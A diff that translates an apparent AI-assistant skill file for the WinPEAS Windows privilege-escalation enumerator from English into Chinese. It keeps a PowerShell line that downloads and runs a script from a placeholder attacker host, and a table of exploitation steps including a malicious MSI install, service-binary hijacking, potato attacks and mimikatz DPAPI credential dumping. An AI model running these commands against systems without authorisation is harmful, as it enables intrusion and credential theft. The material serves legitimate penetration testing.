@@ -1,19 +1,14 @@
 ---
 name: winpeas
 description: >
-  This skill should be used when the user asks about "winpeas", "on Windows as
-  a low-privilege user to surface escalation vectors". Automated Windows
-  privilege escalation enumeration checking service misconfigurations,
-  unquoted service paths, AlwaysInstallElevated, writable registry keys, token
-  privileges, and stored credentials. Use post-exploitation on Windows as a
-  low-privilege user to surface escalation vectors.
+  此技能适用于用户询问关于 "winpeas"、"以低权限用户在 Windows 上发现提权路径"。自动化 Windows 提权枚举工具，可检测服务配置错误、未加引号的服务路径、AlwaysInstallElevated、可写注册表键、Token 权限及存储的凭据。适合后渗透阶段以低权限用户身份发现提权向量。
 ---
 
 # WinPEAS
 
-Windows privilege escalation enumeration.
+Windows 提权 (Privilege Escalation) 枚举工具。
 
-## Quick Start
+## 快速开始
 
 ```
 winPEASx64.exe
@@ -21,30 +16,30 @@ winPEASx64.exe quiet servicesinfo
 IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/winPEAS.ps1")
 ```
 
-## Check Categories
+## 检查类别
 
-| Argument | What it finds |
+| 参数 | 检测内容 |
 |----------|--------------|
-| `systeminfo` | OS/patch level, CVE indicators |
-| `userinfo` | Token privileges, group memberships |
-| `servicesinfo` | Unquoted paths, writable service binaries |
-| `applicationsinfo` | Installed software versions |
-| `networkinfo` | Interfaces, shares, firewall rules |
-| `windowscreds` | DPAPI, vault, autologon, registry creds |
-| `filesinfo` | Writable dirs, interesting files |
+| `systeminfo` | 操作系统版本/补丁级别及 CVE 指示 |
+| `userinfo` | Token 权限、组成员关系 |
+| `servicesinfo` | 未加引号的路径、可写的服务二进制文件 |
+| `applicationsinfo` | 已安装软件版本 |
+| `networkinfo` | 网络接口、共享、防火墙规则 |
+| `windowscreds` | DPAPI、Vault、自动登录、注册表凭据 |
+| `filesinfo` | 可写目录、敏感文件 |
 
-## High-Value Findings
+## 高价值发现
 
-| Finding | Exploit |
+| 发现 | 利用方式 |
 |---------|---------|
 | `AlwaysInstallElevated = 1` | `msiexec /quiet /i evil.msi` |
-| Unquoted service path | Drop exe in unquoted intermediate directory |
-| Writable service binary | Replace binary + restart service |
+| 未加引号的服务路径 | 在路径中间目录放置同名可执行文件 |
+| 可写的服务二进制文件 | 替换二进制文件后重启服务 |
 | SeImpersonatePrivilege | PrintSpoofer / GodPotato |
-| Stored DPAPI credentials | `mimikatz dpapi::` or SharpDPAPI |
+| 存储的 DPAPI 凭据 | `mimikatz dpapi::` 或 SharpDPAPI |
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/` | Potato attacks, exploitation of each vector |
+| `references/` | Potato 系列攻击及各向量利用方法 |
